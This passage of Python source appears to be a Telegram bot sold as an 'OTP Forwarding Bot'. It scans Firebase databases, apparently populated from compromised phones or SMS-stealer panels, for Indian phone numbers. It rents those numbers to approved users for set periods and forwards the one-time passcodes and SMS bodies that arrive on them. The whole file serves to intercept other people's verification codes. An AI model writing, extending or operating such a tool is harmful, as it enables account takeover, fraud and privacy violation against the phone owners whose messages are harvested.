        otp = f" \U0001F511 <code>{esc(h['otp'])}</code>" if h["otp"] else ""
        lines.append(
            f"\U0001F550 {t} · \U0001F4F1 <code>+91{h['num']}</code>{otp}\n"
            f"   \U0001F4E4 {esc(h['sender'])}\n"
            f"   <i>{esc(h['body'][:120])}</i>")
    return "\n".join(lines)

async def _handle_user_firebase(msg, uid: int, url: str):
    """A user pasted a Firebase link: lock them to it and notify admin."""
    entry = _access.get(uid)
    if not entry:
        return
    # Already locked to a different Firebase?
    if entry.get("locked") and entry.get("locked_url") and entry["locked_url"] != url:
        cur = SYSTEMS.get(entry.get("system"))
        await msg.reply_text(
            "\U0001F512 <b>Already locked</b>\n" + DIV +
            f"\nYou are locked to <b>{esc(cur.name if cur else '—')}</b>.\n"
            "Tap \U0001F6AA Logout first to switch Firebase.",
            parse_mode="HTML", reply_markup=main_keyboard(False))
        return

    sys_obj = add_custom_firebase(url, name=f"User {uid}")
    if not sys_obj:
        await msg.reply_text("\u274C Could not register that Firebase link.",
                             reply_markup=main_keyboard(False))
        return

    entry["system"] = sys_obj.sid
    entry["locked"] = True
    entry["locked_url"] = url
    save_access()

    await msg.reply_text(
        "\U0001F517 <b>Firebase link received</b>\n" + DIV +
        f"\n\U0001F512 You are now locked to:\n<code>{esc(url)}</code>\n\n"
        "\U0001F525 Tap <b>Get Number</b> \u2014 you'll get numbers only from this Firebase.\n"
        "Tap \U0001F6AA <b>Logout</b> to unlock.",
        parse_mode="HTML", reply_markup=main_keyboard(False))

    await send_admin(
        "\U0001F517 <b>User Firebase link</b>\n" + DIV +
        f"\n\U0001F464 {esc(entry.get('name') or 'User')} (<code>{uid}</code>)\n"
        f"\U0001F517 <code>{esc(url)}</code>\n"
        f"\U0001F5C2 System: <b>{esc(sys_obj.name)}</b>\n\n"
        "\U0001F504 Scanning this Firebase now...")

    asyncio.create_task(scan_all_systems())

# ── MESSAGE HANDLER ─────────────────────────────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return
    uid = update.effective_chat.id
    text = msg.text.strip()
    is_admin = (uid == ADMIN_ID)

    # ── UNAUTHORIZED ──
    if not is_authorized(uid):
        if text == BTN_REQ:
            if uid in _pending:
                await msg.reply_text("\u23F3 Your request is already pending admin approval.",
                                     reply_markup=request_keyboard())
                return
            name = update.effective_user.full_name if update.effective_user else "User"
            _pending[uid] = {"name": name, "ts": time.time()}
            save_access()
            await msg.reply_text(
                "\u2705 <b>Access requested!</b>\n" + DIV +
                "\nAdmin will review and approve your access shortly.",
                parse_mode="HTML", reply_markup=request_keyboard())
            await send_admin(
                f"\U0001F195 <b>New access request</b>\n{DIV}\n"
                f"\U0001F464 {esc(name)}\n\U0001F194 <code>{uid}</code>\n\n"
                f"Use \u2705 Approve to grant access.")
            return
        await msg.reply_text(
            "\U0001F512 <b>Access required</b>\n" + DIV +
            "\nYou don't have access yet. Tap below to request it.",
            parse_mode="HTML", reply_markup=request_keyboard())
        return

    # ── ADMIN INPUT FLOWS ──
    if is_admin and uid in _admin_state:
        state = _admin_state[uid]
        data = _admin_data.get(uid, {})

        if state == "add_url":
            url = parse_firebase_url(text)
            if not url:
                await msg.reply_text("\u274C Invalid URL. Send a valid Firebase URL "
                                     "(e.g. https://myapp.firebaseio.com) or /cancel.",
                                     reply_markup=back_keyboard())
                return
            data["url"] = url
            _admin_data[uid] = data
            _admin_state[uid] = "add_name"
            await msg.reply_text(f"\U0001F517 URL: <code>{esc(url)}</code>\n\n"
                                 f"Send a <b>name</b> for this system (or <code>-</code> to auto-name).",
                                 parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "add_name":
            data["name"] = "" if text.strip() in ("-", "") else text.strip()
            _admin_data[uid] = data
            _admin_state[uid] = "add_key"
            await msg.reply_text("Send the <b>auth key</b> (database secret) if required, "
                                 "or <code>-</code> to skip.", parse_mode="HTML",
                                 reply_markup=back_keyboard())
            return

        if state == "add_key":
            url = data.get("url")
            name = data.get("name")
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            if not url:
                await msg.reply_text("\u274C Something went wrong. Try again.",
                                     reply_markup=main_keyboard(is_admin))
                return
            keys = [] if text.strip() in ("-", "skip", "none", "") else [text.strip()]
            if any(e.get("url") == url for e in _firebase_urls):
                await msg.reply_text("\u26A0\uFE0F This URL is already added.",
                                     reply_markup=main_keyboard(is_admin))
                return
            _firebase_urls.append({"url": url, "name": name or "", "keys": keys})
            save_firebase_urls()
            await msg.reply_text(
                f"\u2705 <b>Firebase added!</b>\n{DIV}\n"
                f"\U0001F517 <code>{esc(url)}</code>\n"
                f"\U0001F511 Keys: {len(keys)}\n\n"
                f"\U0001F504 Creating its own system & scanning now...",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            asyncio.create_task(scan_all_systems())
            return

        if state == "remove":
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            idx = int(m.group()) - 1 if m else None
            if idx is None or idx < 0 or idx >= len(_firebase_urls):
                await msg.reply_text("\u274C Invalid number. Send /cancel to abort.",
                                     reply_markup=main_keyboard(is_admin))
                return
            removed = _firebase_urls.pop(idx)
            save_firebase_urls()
            await msg.reply_text(
                f"\u2705 <b>Removed</b>\n\U0001F517 <code>{esc(removed.get('url'))}</code>\n\n"
                f"\U0001F504 Rescanning remaining systems...",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            asyncio.create_task(scan_all_systems())
            return

        if state == "approve_uid":
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text("\u274C Send a numeric user ID or /cancel.",
                                     reply_markup=back_keyboard())
                return
            target = int(m.group())
            data["target"] = target
            _admin_data[uid] = data
            _admin_state[uid] = "approve_dur"
            await msg.reply_text(
                f"\U0001F464 User: <code>{target}</code>\n\n"
                f"Send the <b>duration</b> of access.\n"
                f"Examples: <code>12h</code>, <code>3d</code>, <code>1w</code>, "
                f"<code>30m</code>, or <code>0</code> for unlimited.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "approve_dur":
            secs = parse_duration(text)
            if secs is None:
                await msg.reply_text("\u274C Invalid duration. Try <code>12h</code>, "
                                     "<code>3d</code>, <code>1w</code> or /cancel.",
                                     parse_mode="HTML", reply_markup=back_keyboard())
                return
            data["dur"] = secs
            _admin_data[uid] = data
            _admin_state[uid] = "approve_sys"
            await msg.reply_text(
                f"\u23F3 Duration: <b>{fmt_duration(secs)}</b>\n\n"
                f"Now pick a <b>system</b> for this user:\n\n{systems_text()}\n\n"
                f"Send the system number (or <code>0</code> for default).",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "approve_sys":
            target = data.get("target"); secs = data.get("dur", 0)
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            idx = int(m.group()) if m else 0
            if idx > 0:
                shown = display_systems()
                sys_obj = shown[idx - 1] if 0 <= idx - 1 < len(shown) else None
            else:
                sys_obj = best_system_with_numbers() or (system_list()[0] if SYSTEMS else None)
            sid = sys_obj.sid if sys_obj else ""
            name = _pending.get(target, {}).get("name", "User")
            _pending.pop(target, None)
            _access[target] = {"expires": (time.time() + secs) if secs else 0,
                               "system": sid, "name": name}
            save_access()
            await msg.reply_text(
                f"\u2705 <b>Access granted</b>\n{DIV}\n"
                f"\U0001F464 <code>{target}</code>\n"
                f"\u23F3 {fmt_duration(secs)}\n"
                f"\U0001F5C2 {esc(sys_obj.name if sys_obj else '—')}",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            try:
                await _app.bot.send_message(target,
                    f"\u2705 <b>Access granted!</b>\n{DIV}\n"
                    f"\u23F3 Duration: <b>{fmt_duration(secs)}</b>\n"
                    f"\U0001F5C2 System: <b>{esc(sys_obj.name if sys_obj else '—')}</b>\n\n"
                    f"Tap \U0001F525 Get Number to start.",
                    parse_mode="HTML", reply_markup=main_keyboard(False))
            except Exception:
                pass
            return

        if state == "revoke_uid":
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text("\u274C Send a numeric user ID or /cancel.",
                                     reply_markup=main_keyboard(is_admin))
                return
            target = int(m.group())
            _access.pop(target, None)
            _pending.pop(target, None)
            save_access()
            await msg.reply_text(f"\u2705 Revoked access for <code>{target}</code>.",
                                 parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            return

        if state == "setdur_uid":
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text("\u274C Send a numeric user ID or /cancel.",
                                     reply_markup=back_keyboard())
                return
            data["target"] = int(m.group())
            _admin_data[uid] = data
            _admin_state[uid] = "setdur_val"
            await msg.reply_text("Send the new <b>duration</b> (e.g. <code>3d</code>, "
                                 "<code>12h</code>, <code>0</code> = unlimited).",
                                 parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "setdur_val":
            target = data.get("target")
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            secs = parse_duration(text)
            if secs is None or target not in _access:
                await msg.reply_text("\u274C Invalid duration or user not found.",
                                     reply_markup=main_keyboard(is_admin))
                return
            _access[target]["expires"] = (time.time() + secs) if secs else 0
            save_access()
            await msg.reply_text(f"\u2705 Duration for <code>{target}</code> set to "
                                 f"<b>{fmt_duration(secs)}</b>.",
                                 parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            return

        if state == "setsys_uid":
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text("\u274C Send a numeric user ID or /cancel.",
                                     reply_markup=back_keyboard())
                return
            data["target"] = int(m.group())
            _admin_data[uid] = data
            _admin_state[uid] = "setsys_val"
            await msg.reply_text(f"Pick a system:\n\n{systems_text()}\n\n"
                                 f"Send the system number.",
                                 parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "setsys_val":
            target = data.get("target")
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            idx = int(m.group()) if m else 0
            shown = display_systems()
            sys_obj = shown[idx - 1] if 0 <= idx - 1 < len(shown) else None
            if not sys_obj or target not in _access:
                await msg.reply_text("\u274C Invalid system or user not found.",
                                     reply_markup=main_keyboard(is_admin))
                return
            _access[target]["system"] = sys_obj.sid
            save_access()
            await msg.reply_text(f"\u2705 <code>{target}</code> moved to "
                                 f"<b>{esc(sys_obj.name)}</b>.",
                                 parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            return

    # ── USER: PASTE FIREBASE LINK (lock to it) ──
    if not is_admin and _looks_like_firebase(text):
        url = parse_firebase_url(text)
        if url:
            await _handle_user_firebase(msg, uid, url)
            return

    # ── USER: LOGOUT (unlock) ──
    if text == BTN_LOGOUT:
        entry = _access.get(uid)
        if entry and entry.get("locked"):
            entry["locked"] = False
            entry.pop("locked_url", None)
            save_access()
            await msg.reply_text(
                "\U0001F6AA <b>Logged out</b>\n" + DIV +
                "\nYou are no longer locked to a Firebase.\n"
                "Tap \U0001F525 Get Number to use the default system.",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
        else:
            await msg.reply_text("\u2139\uFE0F You are not locked to any Firebase.",
                                 reply_markup=main_keyboard(is_admin))
        return

    # ── MENU ──
    if text == BTN_MENU:
        if not _scan_done:
            await msg.reply_text("\u23F3 System scanning... Please wait.",
                                 reply_markup=back_keyboard())
        else:
            await msg.reply_text(menu_text(uid, is_admin), parse_mode="HTML",
                                 reply_markup=main_keyboard(is_admin))
        return

    # ── GET NUMBER ──
    if text in (BTN_GET, BTN_NEWNUM):
        if not _scan_done:
            await msg.reply_text("\u23F3 Scanning... wait a moment.", reply_markup=back_keyboard())
            return
        if uid in USER_WAITING:
            sid, num = USER_WAITING[uid]
            elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
            remaining = max(0, AUTO_TIMEOUT - elapsed)
            await msg.reply_text(
                f"\u23F3 <b>Already waiting</b>\n{DIV}\n"
                f"\U0001F4F1 <code>+91{num}</code>\n"
                f"\u23F1 Time left: {int(remaining)}s\n\n"
                f"Cancel first to get a different number.",
                parse_mode="HTML", reply_markup=waiting_keyboard())
            return

        sys_obj = get_user_system(uid)
        if not sys_obj:
            await msg.reply_text("\u274C No system available. Contact admin.",
                                 reply_markup=back_keyboard())
            return
        num = get_available_number(sys_obj.sid)
        if not num:
            if _access.get(uid, {}).get("locked"):
                await msg.reply_text(
                    f"\u274C <b>No available numbers</b> in your locked Firebase "
                    f"<b>{esc(sys_obj.name)}</b> right now.\n{DIV}\n"
                    f"\U0001F512 You are locked to this Firebase.\n"
                    f"Try again in a moment, or tap \U0001F6AA Logout to switch.",
                    parse_mode="HTML", reply_markup=main_keyboard(False))
            else:
                total_free = sum(1 for s in system_list()
                                 for p in s.numbers.values() if p.assigned_to is None)
                await msg.reply_text(
                    f"\u274C <b>No available numbers</b> in <b>{esc(sys_obj.name)}</b> right now.\n"
                    f"{DIV}\n"
                    f"\U0001F4F1 Free numbers elsewhere: <b>{total_free}</b>\n"
                    f"Try again in a moment \u2014 numbers free up as OTPs arrive.",
                    parse_mode="HTML", reply_markup=back_keyboard())
            return

        prof = sys_obj.numbers[num]
        prof.assigned_to = uid
        USER_WAITING[uid] = (sys_obj.sid, num)
        USER_WAIT_TIME[uid] = time.time()
        logger.info(f"\U0001F4CB User {uid} assigned +91{num} (sys {sys_obj.sid})")

        devs = [d for d in sys_obj.devices if num in d.numbers]
        online_panels = sum(1 for d in devs if d.status == "online")
        secs = int(prof.seconds_since_last_otp)
        last_str = f"{secs}s ago" if secs < 60 else (f"{secs // 60}m ago" if secs < 3600 else "waiting")
        status_text = {
            "\U0001F525": "\U0001F525 HOT — OTP just now",
            "\U0001F7E2": "\U0001F7E2 LIVE — OTP recently",
            "\U0001F7E1": "\U0001F7E1 WARM — OTP incoming",
            "\U0001F7E0": "\U0001F7E0 COOLING — slow activity",
            "\U0001F480": "\U0001F480 IDLE — waiting for activity",
        }.get(prof.live_status_emoji, "Unknown")
        live_line = ("\U0001F4E9 SMS channel: <b>LIVE</b> \u2705" if num in sys_obj.live_numbers
                     else "\U0001F4E9 SMS channel: <b>warming up</b> \u23F3")

        await msg.reply_text(
            f"\U0001F4F1 <b>Number Assigned</b>\n{DIV}\n"
            f"\U0001F5C2 System: <b>{esc(sys_obj.name)}</b>\n"
            f"\U0001F4DE Number: <code>+91{num}</code>\n"
            f"{live_line}\n"
            f"{status_text}\n"
            f"\U0001F511 Last OTP: {last_str}\n"
            f"\U0001F4C8 Recent OTPs (5m): {prof.recent_otp_count}\n"
            f"\U0001F4BB Live panels: {online_panels}\n\n"
            f"\u26A1 Watching for SMS now...\n\u23F1 Timeout: 5 minutes",
            parse_mode="HTML", reply_markup=waiting_keyboard())
        return

    # ── MY STATUS ──
    if text == BTN_MY:
        if uid in USER_WAITING:
            sid, num = USER_WAITING[uid]
            s = SYSTEMS.get(sid)
            prof = s.numbers.get(num) if s else None
            elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
            remaining = max(0, AUTO_TIMEOUT - elapsed)
            rem_access = access_remaining(uid)
            status_text = {
                "\U0001F525": "\U0001F525 HOT", "\U0001F7E2": "\U0001F7E2 LIVE",
                "\U0001F7E1": "\U0001F7E1 WARM", "\U0001F7E0": "\U0001F7E0 COOLING",
                "\U0001F480": "\U0001F480 IDLE",
            }.get(prof.live_status_emoji if prof else "\U0001F480", "Unknown")
            await msg.reply_text(
                f"\U0001F4CA <b>My Status</b>\n{DIV}\n"
                f"\U0001F5C2 System: <b>{esc(s.name if s else '—')}</b>\n"
                f"\U0001F4F1 Number: <code>+91{num}</code>\n"
                f"{status_text}\n"
                f"\U0001F4C8 Recent OTPs (5m): {prof.recent_otp_count if prof else 0}\n"
                f"\u23F1 Wait left: {int(remaining)}s\n"
                f"\U0001F513 Access: {fmt_duration(rem_access)}\n\n"
                f"\u26A1 Watching...",
                parse_mode="HTML", reply_markup=waiting_keyboard())
        else:
            rem_access = access_remaining(uid)
            sys_obj = get_user_system(uid)
            await msg.reply_text(
                f"\U0001F4CA <b>My Status</b>\n{DIV}\n"
                f"\U0001F513 Access: {fmt_duration(rem_access)}\n"
                f"\U0001F5C2 System: <b>{esc(sys_obj.name if sys_obj else '—')}</b>\n\n"
                f"\u274C No active waiting.\nGet a number first \U0001F447",
                parse_mode="HTML", reply_markup=_kb([
                    [KeyboardButton(BTN_GET)], [KeyboardButton(BTN_MENU)]]))
        return

    # ── SMS HISTORY ──
    if text == BTN_HISTORY:
        if is_admin:
            await msg.reply_text(history_text(None), parse_mode="HTML",
                                 reply_markup=back_keyboard())
        else:
            sys_obj = get_user_system(uid)
            sid = sys_obj.sid if sys_obj else None
            await msg.reply_text(history_text(sid), parse_mode="HTML",
                                 reply_markup=back_keyboard())
        return

    # ── CANCEL ──
    if text in (BTN_CANCEL, BTN_STOP):
        if uid in USER_WAITING:
            sid, num = USER_WAITING.pop(uid)
            USER_WAIT_TIME.pop(uid, None)
            s = SYSTEMS.get(sid)
            if s and num in s.numbers:
                s.numbers[num].assigned_to = None
            await msg.reply_text(f"\u2705 Cancelled waiting for <code>+91{num}</code>.",
                                 parse_mode="HTML", reply_markup=_kb([
                                     [KeyboardButton(BTN_GET)], [KeyboardButton(BTN_MENU)]]))
        else:
            await msg.reply_text("Nothing to cancel.", reply_markup=back_keyboard())
        return

    # ── ADMIN: DASHBOARD ──
    if text == BTN_DASH:
        if not is_admin: return
        total_devs = sum(len(s.devices) for s in system_list())
        total_online = sum(s.stats["online"] for s in system_list())
        total_nums = sum(len(s.numbers) for s in system_list())
        total_live = sum(len(s.live_numbers) for s in system_list())
        in_use = sum(1 for s in system_list() for p in s.numbers.values() if p.assigned_to is not None)
        scan_status = "\u2705 Ready" if _scan_done else "\u23F3 Scanning..."
        await msg.reply_text(
            f"\U0001F4C8 <b>Dashboard</b>\n{DIV}\n"
            f"\U0001F5C2 Systems: <b>{len(SYSTEMS)}</b>\n"
            f"\U0001F4BB Devices: <b>{total_online}</b> online / {total_devs} total\n"
            f"\U0001F4F1 Numbers: <b>{total_nums}</b> ({total_nums - in_use} free / {in_use} busy)\n"
            f"\U0001F4E9 Live (SMS-ready): <b>{total_live}</b>\n"
            f"\U0001F465 Users: <b>{len(_access)}</b> · Pending: {len(_pending)}\n"
            f"\u23F3 Waiting: {len(USER_WAITING)}\n"
            f"\U0001F4E9 SMS seen: {len(SEEN_SMS)}\n"
            f"\U0001F4DC History: {len(_sms_history)}\n"
            f"\U0001F50D Scan: {scan_status}",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: SYSTEMS ──
    if text == BTN_SYSTEMS:
        if not is_admin: return
        await msg.reply_text(systems_text(), parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: USERS ──
    if text == BTN_USERS:
        if not is_admin: return
        await msg.reply_text(users_text(), parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: APPROVE ──
    if text == BTN_APPROVE:
        if not is_admin: return
        if _pending:
            lines = [f"\u2705 <b>Approve User</b>\n{DIV}\n<b>Pending:</b>"]
            for puid, p in _pending.items():
                lines.append(f"   \U0001F464 {esc(p.get('name') or 'User')} (<code>{puid}</code>)")
            lines.append("\nSend the user ID to approve, or /cancel.")
        else:
            lines = [f"\u2705 <b>Approve User</b>\n{DIV}\n"
                     "Send the user ID to approve, or /cancel."]
        _admin_state[uid] = "approve_uid"
        await msg.reply_text("\n".join(lines), parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: REVOKE ──
    if text == BTN_REVOKE:
        if not is_admin: return
        _admin_state[uid] = "revoke_uid"
        await msg.reply_text(f"\U0001F6AB <b>Revoke Access</b>\n{DIV}\n{users_text()}\n\n"
                             f"Send the user ID to revoke, or /cancel.",
                             parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: SET DURATION ──
    if text == BTN_SETDUR:
        if not is_admin: return
        _admin_state[uid] = "setdur_uid"
        await msg.reply_text(f"\u23F3 <b>Set Duration</b>\n{DIV}\n{users_text()}\n\n"
                             f"Send the user ID, or /cancel.",
                             parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: SET SYSTEM ──
    if text == BTN_SETSYS:
        if not is_admin: return
        _admin_state[uid] = "setsys_uid"
        await msg.reply_text(f"\U0001F5C2 <b>Set System</b>\n{DIV}\n{users_text()}\n\n"
                             f"Send the user ID, or /cancel.",
                             parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: ADD FIREBASE ──
    if text == BTN_ADDFB:
        if not is_admin: return
        _admin_state[uid] = "add_url"
        _admin_data[uid] = {}
        await msg.reply_text(
            "\u2795 <b>Add Firebase</b>\n" + DIV +
            "\nSend the Firebase Realtime Database URL.\n"
            "Example: <code>https://myapp.firebaseio.com</code>\n\n"
            "Send /cancel to abort.", parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: REMOVE FIREBASE ──
    if text == BTN_RMFB:
        if not is_admin: return
        if not _firebase_urls:
            await msg.reply_text("No custom Firebase URLs to remove.",
                                 reply_markup=back_keyboard())
            return
        lines = ["\U0001F5D1 <b>Remove Firebase</b>\n" + DIV]
        for i, entry in enumerate(_firebase_urls, 1):
            lines.append(f"  {i}. {esc(entry.get('name') or 'System')} — <code>{esc(entry.get('url'))}</code>")
        lines.append("\nSend the number to remove, or /cancel.")
        _admin_state[uid] = "remove"
        await msg.reply_text("\n".join(lines), parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── ADMIN: RESCAN ──
    if text == BTN_RESCAN:
        if not is_admin: return
        await msg.reply_text("\U0001F504 Starting rescan...", reply_markup=back_keyboard())
        asyncio.create_task(scan_all_systems())
        return

    # ── PAGE NAVIGATION ──
    if text in (BTN_PREV, BTN_NEXT):
        lst = _user_list.get(uid, [])
        if not lst:
            await msg.reply_text("Open a list first.", reply_markup=main_keyboard(is_admin))
            return
        page = _user_page.get(uid, 0) + (1 if text == BTN_NEXT else -1)
        per_page = 10
        max_page = max(0, (len(lst) - 1) // per_page)
        page = max(0, min(page, max_page))
        _user_page[uid] = page
        await msg.reply_text(f"\U0001F4F1 <b>Numbers</b> (Page {page + 1})\n\nTap to assign \U0001F447",
                             parse_mode="HTML", reply_markup=number_list_keyboard(lst, page=page))
        return

    # ── PICK NUMBER (dynamic label) ──
    m = re.search(r"\+91(\d{10})", text)
    if m:
        num = m.group(1)
        if uid in USER_WAITING:
            sid, cur = USER_WAITING[uid]
            await msg.reply_text(f"\u23F3 Already waiting for <code>+91{cur}</code>. Cancel first.",
                                 parse_mode="HTML", reply_markup=waiting_keyboard())
            return
        sys_obj = get_user_system(uid)
        if not sys_obj or num not in sys_obj.numbers or sys_obj.numbers[num].assigned_to is not None:
            await msg.reply_text("\u274C Number no longer available. Pick another.",
                                 reply_markup=_kb([[KeyboardButton(BTN_GET)],
                                                   [KeyboardButton(BTN_MENU)]]))
            return
        prof = sys_obj.numbers[num]
        prof.assigned_to = uid
        USER_WAITING[uid] = (sys_obj.sid, num)
        USER_WAIT_TIME[uid] = time.time()
        is_live = num in sys_obj.live_numbers
        live_line = ("\U0001F4E9 SMS channel: <b>LIVE</b> \u2705" if is_live
                     else "\U0001F4E9 SMS channel: <b>warming up</b> \u23F3")
        await msg.reply_text(
            f"\U0001F4F1 <b>Number Assigned</b>\n{DIV}\n"
            f"\U0001F5C2 System: <b>{esc(sys_obj.name)}</b>\n"
            f"\U0001F4DE Number: <code>+91{num}</code>\n"
            f"{live_line}\n"
            f"\U0001F4C8 Recent OTPs (5m): {prof.recent_otp_count}\n\n"
            f"\u26A1 Watching for OTP...",
            parse_mode="HTML", reply_markup=waiting_keyboard())
        return

def menu_text(uid, is_admin) -> str:
    if is_admin:
        total_nums = sum(len(s.numbers) for s in system_list())
        total_online = sum(s.stats["online"] for s in system_list())
        return (f"\U0001F916 <b>OTP Forwarding Bot</b>\n{DIV}\n"
                f"\U0001F5C2 Systems: <b>{len(SYSTEMS)}</b>\n"
                f"\U0001F4BB Online devices: <b>{total_online}</b>\n"
                f"\U0001F4F1 Numbers: <b>{total_nums}</b>\n"
                f"\U0001F465 Users: <b>{len(_access)}</b> · Pending: {len(_pending)}\n\n"
                f"Tap a button below \U0001F447")
    sys_obj = get_user_system(uid)
    rem = access_remaining(uid)
    avail = len(get_all_numbers(sys_obj.sid)) if sys_obj else 0
    locked = _access.get(uid, {}).get("locked")
    lock_line = (f"\U0001F512 Locked to: <b>{esc(sys_obj.name if sys_obj else '—')}</b>\n"
                 if locked else "")
    return (f"\U0001F916 <b>OTP Forwarding Bot</b>\n{DIV}\n"
            f"{lock_line}"
            f"\U0001F5C2 System: <b>{esc(sys_obj.name if sys_obj else '—')}</b>\n"
            f"\U0001F4F1 Available numbers: <b>{avail}</b>\n"
            f"\U0001F513 Access: <b>{fmt_duration(rem)}</b>\n\n"
            f"Tap a button below \U0001F447")

# ── COMMANDS ────────────────────────────────────────────────────────────────
async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    _admin_state.pop(uid, None)
    _admin_data.pop(uid, None)
    await update.message.reply_text("\u2705 Cancelled.",
                                    reply_markup=main_keyboard(uid == ADMIN_ID))

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if not is_authorized(uid):
        await update.message.reply_text(
            "\U0001F512 <b>Access required</b>\n" + DIV +
            "\nYou don't have access yet. Tap below to request it.",
            parse_mode="HTML", reply_markup=request_keyboard())
        return
    if not _scan_done:
        await update.message.reply_text("\u23F3 System scanning... Please wait.",
                                        reply_markup=back_keyboard())
        return
    await update.message.reply_text(menu_text(uid, uid == ADMIN_ID), parse_mode="HTML",
                                    reply_markup=main_keyboard(uid == ADMIN_ID))

# ── MAIN ────────────────────────────────────────────────────────────────────
def main():
    global _app
    print("=" * 50)
    print("  \U0001F511 OTP BOT - PREMIUM MULTI-SYSTEM v5.0")
    print("=" * 50)
    print(f"Admin: {ADMIN_ID}")
    print(f"Built-in Databases: {len(DATABASES)}")
    print("No initial SMS scan (instant start)")
    print("Time-based access + separate system per Firebase")
    print()

    load_firebase_urls()
    load_access()

    app = Application.builder().token(TOKEN).build()
    _app = app

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    async def post_init(application):
        await application.bot.delete_webhook(drop_pending_updates=True)
        await send_admin("\U0001F511 <b>OTP Bot v5.0 starting!</b>\nScanning systems...")
        await scan_all_systems()
        await asyncio.sleep(2)
        asyncio.create_task(background_monitor_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
